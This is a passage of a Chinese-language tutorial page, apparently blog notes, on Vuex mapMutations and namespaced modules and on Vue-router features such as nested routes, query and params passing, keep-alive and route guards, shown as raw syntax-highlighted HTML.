class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">export</span> <span class="keyword">default</span> &#123;</span></span><br><span class="line"><span class="javascript">        <span class="function"><span class="title">data</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line">            reruen&#123;</span><br><span class="line">                n:1</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        methods:&#123;</span><br><span class="line">            /*</span><br><span class="line"><span class="javascript">            <span class="function"><span class="title">increment</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="built_in">this</span>.$store.commit(<span class="string">&#x27;JIA&#x27;</span>,<span class="built_in">this</span>.n)</span></span><br><span class="line">            &#125;</span><br><span class="line"><span class="javascript">            <span class="function"><span class="title">decrement</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="built_in">this</span>.$store.commit(<span class="string">&#x27;JIAN&#x27;</span>,<span class="built_in">this</span>.n)</span></span><br><span class="line">            &#125;</span><br><span class="line">            */</span><br><span class="line"></span><br><span class="line"><span class="javascript">            <span class="comment">//借助mapMutations生成对应的方法，方法中会调用commit去联系mutations</span></span></span><br><span class="line"><span class="javascript">            <span class="comment">//靠mapMutations生成：increment、decrement（对象形式）</span></span></span><br><span class="line"><span class="javascript">            ...mapMutations(&#123;<span class="attr">increment</span>:<span class="string">&#x27;JIA&#x27;</span>,<span class="attr">decrement</span>:<span class="string">&#x27;JIAN&#x27;</span>&#125;),</span></span><br><span class="line"></span><br><span class="line"><span class="javascript">            <span class="comment">//靠mapMutations生成：JIA、JIAN（数组写法）</span></span></span><br><span class="line"><span class="javascript">            ...mapMutations([<span class="string">&#x27;JIA&#x27;</span>,<span class="string">&#x27;JIAN&#x27;</span>]),</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></li></ol><blockquote><p>备注：mapActions与mapMutations使用时，若需要传递参数需要：在模板中绑定事件时传递好参数，否则参数是事件对象。</p></blockquote><h3 id="模块化-命名空间"><a href="#模块化-命名空间" class="headerlink" title="模块化+命名空间"></a>模块化+命名空间</h3><ol><li><p>目的：让代码更好维护，让多种数据分类更加明确。</p></li><li><p>修改<code>store.js</code></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> countAbout = &#123;</span><br><span class="line">    namespaced:<span class="literal">true</span>,<span class="comment">//开启命名空间</span></span><br><span class="line">    state:&#123;<span class="attr">x</span>:<span class="number">1</span>&#125;,</span><br><span class="line">    mutations: &#123; ... &#125;,</span><br><span class="line">    actions: &#123; ... &#125;,</span><br><span class="line">    getters: &#123;</span><br><span class="line">        <span class="function"><span class="title">bigSum</span>(<span class="params">state</span>)</span>&#123;</span><br><span class="line">             <span class="keyword">return</span> state.sum * <span class="number">10</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> personAbout = &#123;</span><br><span class="line">     namespaced:<span class="literal">true</span>,<span class="comment">//开启命名空间</span></span><br><span class="line">     state:&#123; ... &#125;,</span><br><span class="line">     mutations: &#123; ... &#125;,</span><br><span class="line">     actions: &#123; ... &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> store = <span class="keyword">new</span> Vuex.Store(&#123;</span><br><span class="line">     modules: &#123;</span><br><span class="line">     countAbout,</span><br><span class="line">     personAbout</span><br><span class="line">&#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></li><li><p>开启命名空间后，组件中读取state数据：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//方式一：自己直接读取</span></span><br><span class="line"><span class="built_in">this</span>.$store.state.personAbout.list</span><br><span class="line"><span class="comment">//方式二：借助mapState读取：</span></span><br><span class="line">...mapState(<span class="string">&#x27;countAbout&#x27;</span>,[<span class="string">&#x27;sum&#x27;</span>,<span class="string">&#x27;school&#x27;</span>,<span class="string">&#x27;subject&#x27;</span>]),</span><br></pre></td></tr></table></figure></li><li><p>开启命名空间后，组件中读取getters数据：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//方式一：自己直接读取</span></span><br><span class="line"><span class="built_in">this</span>.$store.getters[<span class="string">&#x27;personAbout/firstPersonName&#x27;</span>]</span><br><span class="line"><span class="comment">//方式二：借助mapGetters读取：</span></span><br><span class="line">...mapGetters(<span class="string">&#x27;countAbout&#x27;</span>,[<span class="string">&#x27;bigSum&#x27;</span>])</span><br></pre></td></tr></table></figure></li><li><p>开启命名空间后，组件中调用dispatch</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//方式一：自己直接dispatch</span></span><br><span class="line"><span class="built_in">this</span>.$store.dispatch(<span class="string">&#x27;personAbout/addPersonWang&#x27;</span>,person)</span><br><span class="line"><span class="comment">//方式二：借助mapActions：</span></span><br><span class="line">...mapActions(<span class="string">&#x27;countAbout&#x27;</span>,&#123;<span class="attr">incrementOdd</span>:<span class="string">&#x27;jiaOdd&#x27;</span>,<span class="attr">incrementWait</span>:<span class="string">&#x27;jiaWait&#x27;</span>&#125;)</span><br></pre></td></tr></table></figure></li><li><p>开启命名空间后，组件中调用commit</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//方式一：自己直接commit</span></span><br><span class="line"><span class="built_in">this</span>.$store.commit(<span class="string">&#x27;personAbout/ADD_PERSON&#x27;</span>,person)</span><br><span class="line"><span class="comment">//方式二：借助mapMutations：</span></span><br><span class="line">...mapMutations(<span class="string">&#x27;countAbout&#x27;</span>,&#123;<span class="attr">increment</span>:<span class="string">&#x27;JIA&#x27;</span>,<span class="attr">decrement</span>:<span class="string">&#x27;JIAN&#x27;</span>&#125;),</span><br></pre></td></tr></table></figure></li></ol><h1 id="Vue-router"><a href="#Vue-router" class="headerlink" title="Vue-router"></a>Vue-router</h1><p><strong>对SPA应用的理解</strong></p><p>1.单页Web应用(single page web application,SPA)。</p><p>2.整个应用只有一个完整的页面。</p><p>3.点击页面中的导航链接不会刷新页面，只会做页面的局部更新。</p><p>4.数据需要通过ajax请求获取。</p><p><strong>路由</strong></p><ol><li>理解： 一个路由（route）就是一组映射关系（key - value），多个路由需要路由器（router）进行管理。</li><li>前端路由：key是路径，value是组件。</li></ol><h3 id="基本使用-1"><a href="#基本使用-1" class="headerlink" title="基本使用"></a>基本使用</h3><ol><li><p>安装vue-router，命令：<code>npm i vue-router</code></p></li><li><p>应用插件：<code>Vue.use(VueRouter)</code></p></li><li><p>编写router配置项:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//引入VueRouter</span></span><br><span class="line"><span class="keyword">import</span> VueRouter <span class="keyword">from</span> <span class="string">&#x27;vue-router&#x27;</span></span><br><span class="line"><span class="comment">//引入路由组件</span></span><br><span class="line"><span class="keyword">import</span> About <span class="keyword">from</span> <span class="string">&#x27;../components/About&#x27;</span></span><br><span class="line"><span class="keyword">import</span> Home <span class="keyword">from</span> <span class="string">&#x27;../components/Home&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//创建router实例对象，去管理一组一组的路由规则</span></span><br><span class="line"><span class="keyword">const</span> router = <span class="keyword">new</span> VueRouter(&#123;</span><br><span class="line">    routes:[</span><br><span class="line">        &#123;</span><br><span class="line">            path:<span class="string">&#x27;/about&#x27;</span>,</span><br><span class="line">            component:About</span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">            path:<span class="string">&#x27;/home&#x27;</span>,</span><br><span class="line">            component:Home</span><br><span class="line">        &#125;</span><br><span class="line">    ]</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">//暴露router</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> router</span><br></pre></td></tr></table></figure></li><li><p>实现切换（active-class可配置高亮样式）</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">router-link</span> <span class="attr">active-class</span>=<span class="string">&quot;active&quot;</span> <span class="attr">to</span>=<span class="string">&quot;/about&quot;</span>&gt;</span>About<span class="tag">&lt;/<span class="name">router-link</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>指定展示位置</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">router-view</span>&gt;</span><span class="tag">&lt;/<span class="name">router-view</span>&gt;</span></span><br></pre></td></tr></table></figure></li></ol><h3 id="几个注意点"><a href="#几个注意点" class="headerlink" title="几个注意点"></a>几个注意点</h3><ol><li>路由组件通常存放在<code>pages</code>文件夹，一般组件通常存放在<code>components</code>文件夹。</li><li>通过切换，“隐藏”了的路由组件，默认是被销毁掉的，需要的时候再去挂载。</li><li>每个组件都有自己的<code>$route</code>属性，里面存储着自己的路由信息。</li><li>整个应用只有一个router，可以通过组件的<code>$router</code>属性获取到。</li></ol><h3 id="多级路由（多级路由）"><a href="#多级路由（多级路由）" class="headerlink" title="多级路由（多级路由）"></a>多级路由（多级路由）</h3><ol><li><p>配置路由规则，使用children配置项：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">routes:[</span><br><span class="line">    &#123;</span><br><span class="line">        path:<span class="string">&#x27;/about&#x27;</span>,</span><br><span class="line">        component:About,</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">        path:<span class="string">&#x27;/home&#x27;</span>,</span><br><span class="line">        component:Home,</span><br><span class="line">        children:[ <span class="comment">//通过children配置子级路由</span></span><br><span class="line">            &#123;</span><br><span class="line">                path:<span class="string">&#x27;news&#x27;</span>, <span class="comment">//此处一定不要写：/news</span></span><br><span class="line">                component:News</span><br><span class="line">            &#125;,</span><br><span class="line">            &#123;</span><br><span class="line">                path:<span class="string">&#x27;message&#x27;</span>,<span class="comment">//此处一定不要写：/message</span></span><br><span class="line">                component:Message</span><br><span class="line">            &#125;</span><br><span class="line">        ]</span><br><span class="line">    &#125;</span><br><span class="line">]</span><br></pre></td></tr></table></figure></li><li><p>跳转（要写完整路径）：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">router-link</span> <span class="attr">to</span>=<span class="string">&quot;/home/news&quot;</span>&gt;</span>News<span class="tag">&lt;/<span class="name">router-link</span>&gt;</span></span><br></pre></td></tr></table></figure></li></ol><h3 id="路由的query参数"><a href="#路由的query参数" class="headerlink" title="路由的query参数"></a>路由的query参数</h3><ol><li><p>传递参数</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 跳转并携带query参数，to的字符串写法 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">router-link</span> <span class="attr">:to</span>=<span class="string">&quot;/home/message/detail?id=666&amp;title=你好&quot;</span>&gt;</span>跳转<span class="tag">&lt;/<span class="name">router-link</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">router-link</span> <span class="attr">:to</span>=<span class="string">&quot;`/home/message/detail?id=$&#123;item.id&#125;&amp;title=$&#123;item.title&#125;`&quot;</span>&gt;</span>跳转<span class="tag">&lt;/<span class="name">router-link</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 跳转并携带query参数，to的对象写法 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">router-link</span> </span></span><br><span class="line"><span class="tag">             <span class="attr">:to</span>=<span class="string">&quot;&#123;</span></span></span><br><span class="line"><span class="tag"><span class="string">                  path:&#x27;/home/message/detail&#x27;,</span></span></span><br><span class="line"><span class="tag"><span class="string">                  query:&#123;</span></span></span><br><span class="line"><span class="tag"><span class="string">                  id:666,</span></span></span><br><span class="line"><span class="tag"><span class="string">                  title:&#x27;你好&#x27;</span></span></span><br><span class="line"><span class="tag"><span class="string">                  &#125;</span></span></span><br><span class="line"><span class="tag"><span class="string">                  &#125;&quot;</span></span></span><br><span class="line"><span class="tag">             &gt;</span>跳转<span class="tag">&lt;/<span class="name">router-link</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>接收参数：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$route.query.id</span><br><span class="line">$route.query.title</span><br></pre></td></tr></table></figure></li></ol><h3 id="命名路由"><a href="#命名路由" class="headerlink" title="命名路由"></a>命名路由</h3><ol><li><p>作用：可以简化路由的跳转。</p></li><li><p>如何使用</p><ol><li><p>给路由命名：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    path:<span class="string">&#x27;/demo&#x27;</span>,</span><br><span class="line">        component:Demo,</span><br><span class="line">            children:[</span><br><span class="line">                &#123;</span><br><span class="line">                    path:<span class="string">&#x27;test&#x27;</span>,</span><br><span class="line">                    component:Test,</span><br><span class="line">                    children:[</span><br><span class="line">                        &#123;</span><br><span class="line">                            name:<span class="string">&#x27;hello&#x27;</span> <span class="comment">//给路由命名</span></span><br><span class="line">                            path:<span class="string">&#x27;welcome&#x27;</span>,</span><br><span class="line">                            component:Hello,</span><br><span class="line">                        &#125;</span><br><span class="line">                    ]</span><br><span class="line">                &#125;</span><br><span class="line">            ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>简化跳转：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--简化前，需要写完整的路径 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">router-link</span> <span class="attr">to</span>=<span class="string">&quot;/demo/test/welcome&quot;</span>&gt;</span>跳转<span class="tag">&lt;/<span class="name">router-link</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--简化后，直接通过名字跳转 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">router-link</span> <span class="attr">:to</span>=<span class="string">&quot;&#123;name:&#x27;hello&#x27;&#125;&quot;</span>&gt;</span>跳转<span class="tag">&lt;/<span class="name">router-link</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--简化写法配合传递参数 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">router-link</span> </span></span><br><span class="line"><span class="tag">             <span class="attr">:to</span>=<span class="string">&quot;&#123;</span></span></span><br><span class="line"><span class="tag"><span class="string">                  name:&#x27;hello&#x27;,</span></span></span><br><span class="line"><span class="tag"><span class="string">                  query:&#123;</span></span></span><br><span class="line"><span class="tag"><span class="string">                  id:666,</span></span></span><br><span class="line"><span class="tag"><span class="string">                  title:&#x27;你好&#x27;</span></span></span><br><span class="line"><span class="tag"><span class="string">                  &#125;</span></span></span><br><span class="line"><span class="tag"><span class="string">                  &#125;&quot;</span></span></span><br><span class="line"><span class="tag">             &gt;</span>跳转<span class="tag">&lt;/<span class="name">router-link</span>&gt;</span></span><br></pre></td></tr></table></figure></li></ol></li></ol><h3 id="路由的params参数"><a href="#路由的params参数" class="headerlink" title="路由的params参数"></a>路由的params参数</h3><ol><li><p>配置路由，声明接收params参数</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    path:<span class="string">&#x27;/home&#x27;</span>,</span><br><span class="line">        component:Home,</span><br><span class="line">            children:[</span><br><span class="line">                &#123;</span><br><span class="line">                    path:<span class="string">&#x27;news&#x27;</span>,</span><br><span class="line">                    component:News</span><br><span class="line">                &#125;,</span><br><span class="line">                &#123;</span><br><span class="line">                    component:Message,</span><br><span class="line">                    children:[</span><br><span class="line">                        &#123;</span><br><span class="line">                            name:<span class="string">&#x27;xiangqing&#x27;</span>,</span><br><span class="line">                            path:<span class="string">&#x27;detail/:id/:title&#x27;</span>, <span class="comment">//使用占位符声明接收params参数</span></span><br><span class="line">                            component:Detail</span><br><span class="line">                        &#125;</span><br><span class="line">                    ]</span><br><span class="line">                &#125;</span><br><span class="line">            ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>传递参数</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 跳转并携带params参数，to的字符串写法 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">router-link</span> <span class="attr">to</span>=<span class="string">&quot;/home/message/detail/666/你好&quot;</span>&gt;</span>跳转<span class="tag">&lt;/<span class="name">router-link</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 跳转并携带params参数，to的对象写法 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">router-link</span> </span></span><br><span class="line"><span class="tag">             <span class="attr">:to</span>=<span class="string">&quot;&#123;</span></span></span><br><span class="line"><span class="tag"><span class="string">                  name:&#x27;xiangqing&#x27;,</span></span></span><br><span class="line"><span class="tag"><span class="string">                  params:&#123;</span></span></span><br><span class="line"><span class="tag"><span class="string">                  id:666,</span></span></span><br><span class="line"><span class="tag"><span class="string">                  title:&#x27;你好&#x27;</span></span></span><br><span class="line"><span class="tag"><span class="string">                  &#125;</span></span></span><br><span class="line"><span class="tag"><span class="string">                  &#125;&quot;</span></span></span><br><span class="line"><span class="tag">             &gt;</span>跳转<span class="tag">&lt;/<span class="name">router-link</span>&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>特别注意：路由携带params参数时，若使用to的对象写法，则不能使用path配置项，必须使用name配置！</p></blockquote></li><li><p>接收参数：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$route.params.id</span><br><span class="line">$route.params.title</span><br></pre></td></tr></table></figure></li></ol><h3 id="路由的props配置"><a href="#路由的props配置" class="headerlink" title="路由的props配置"></a>路由的props配置</h3><p>​    作用：让路由组件更方便的收到参数</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    name:<span class="string">&#x27;xiangqing&#x27;</span>,</span><br><span class="line">        path:<span class="string">&#x27;detail/:id&#x27;</span>,</span><br><span class="line">            component:Detail,</span><br><span class="line"></span><br><span class="line">                <span class="comment">//第一种写法：props值为对象，该对象中所有的key-value的组合最终都会通过props传给Detail组件</span></span><br><span class="line">                <span class="comment">// props:&#123;a:900&#125;</span></span><br><span class="line"></span><br><span class="line">                <span class="comment">//第二种写法：props值为布尔值，布尔值为true，则把路由收到的所有params参数通过props传给Detail组件</span></span><br><span class="line">                <span class="comment">// props:true</span></span><br><span class="line"></span><br><span class="line">                <span class="comment">//第三种写法：props值为函数，该函数返回的对象中每一组key-value都会通过props传给Detail组件,props:[&#x27;id&#x27;,&#x27;title&#x27;]</span></span><br><span class="line">                <span class="function"><span class="title">props</span>(<span class="params">route</span>)</span>&#123;</span><br><span class="line">                <span class="keyword">return</span> &#123;</span><br><span class="line">                    id:route.query.id,</span><br><span class="line">                    title:route.query.title</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="lt-router-link-gt-的replace属性"><a href="#lt-router-link-gt-的replace属性" class="headerlink" title="&lt;router-link&gt;的replace属性"></a><code>&lt;router-link&gt;</code>的replace属性</h3><ol><li>作用：控制路由跳转时操作浏览器历史记录的模式（前进和后退）</li><li>浏览器的历史记录有两种写入方式：分别为<code>push</code>和<code>replace</code>，<code>push</code>是追加历史记录，<code>replace</code>是替换当前记录。路由跳转时候默认为<code>push</code></li><li>如何开启<code>replace</code>模式：<code>&lt;router-link replace .......&gt;News&lt;/router-link&gt;</code></li></ol><h3 id="编程式路由导航"><a href="#编程式路由导航" class="headerlink" title="编程式路由导航"></a>编程式路由导航</h3><ol><li><p>作用：不借助<code>&lt;router-link&gt;</code>实现路由跳转，让路由跳转更加灵活</p></li><li><p>具体编码：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//$router的两个API</span></span><br><span class="line"><span class="built_in">this</span>.$router.push(&#123;</span><br><span class="line">    name:<span class="string">&#x27;xiangqing&#x27;</span>,</span><br><span class="line">    params:&#123;</span><br><span class="line">        id:xxx,</span><br><span class="line">        title:xxx</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="built_in">this</span>.$router.replace(&#123;</span><br><span class="line">    name:<span class="string">&#x27;xiangqing&#x27;</span>,</span><br><span class="line">    params:&#123;</span><br><span class="line">        id:xxx,</span><br><span class="line">        title:xxx</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line"><span class="built_in">this</span>.$router.forward() <span class="comment">//前进</span></span><br><span class="line"><span class="built_in">this</span>.$router.back() <span class="comment">//后退</span></span><br><span class="line"><span class="built_in">this</span>.$router.go() <span class="comment">//可前进也可后退，负数代表后退，正数代表前进</span></span><br></pre></td></tr></table></figure></li></ol><h3 id="缓存路由组件"><a href="#缓存路由组件" class="headerlink" title="缓存路由组件"></a>缓存路由组件</h3><ol><li><p>作用：让不展示的路由组件保持挂载，不被销毁。</p></li><li><p>具体编码：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- include的值是组件的名字，组件有给name取组件名的话，就用name的组件名 --&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 缓存一个 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">keep-alive</span> <span class="attr">include</span>=<span class="string">&quot;News&quot;</span>&gt;</span> </span><br><span class="line">    <span class="tag">&lt;<span class="name">router-view</span>&gt;</span><span class="tag">&lt;/<span class="name">router-view</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">keep-alive</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 缓存多个 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">keep-alive</span> <span class="attr">:include</span>=<span class="string">&quot;[&#x27;News&#x27;,&#x27;Home&#x27;]&quot;</span>&gt;</span> </span><br><span class="line">    <span class="tag">&lt;<span class="name">router-view</span>&gt;</span><span class="tag">&lt;/<span class="name">router-view</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">keep-alive</span>&gt;</span></span><br></pre></td></tr></table></figure></li></ol><h3 id="两个新的生命周期钩子"><a href="#两个新的生命周期钩子" class="headerlink" title="两个新的生命周期钩子"></a>两个新的生命周期钩子</h3><ol><li>作用：路由组件所独有的两个钩子，用于捕获路由组件的激活状态。</li><li>具体名字：<ol><li><code>activated</code>路由组件被激活时触发。</li><li><code>deactivated</code>路由组件失活时触发。</li></ol></li></ol><h3 id="路由守卫"><a href="#路由守卫" class="headerlink" title="路由守卫"></a>路由守卫</h3><ol><li><p>作用：对路由进行权限控制 </p></li><li><p>分类：全局守卫、独享守卫、组件内守卫</p></li><li><p>全局守卫:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//创建并暴露一个路由器</span></span><br><span class="line"><span class="keyword">const</span> router =  <span class="keyword">new</span> VueRouter(&#123;</span><br><span class="line">    routes:[</span><br><span class="line">        &#123;</span><br><span class="line">            name:<span class="string">&#x27;guanyu&#x27;</span>,</span><br><span class="line">            path:<span class="string">&#x27;/about&#x27;</span>,</span><br><span class="line">            component:About,</span><br><span class="line">            <span class="comment">//需要验证的权限，可以向meta对象中添加数据，key的名字可以随便取</span></span><br><span class="line">            meta:&#123;isAuth;<span class="literal">true</span>&#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">            path:<span 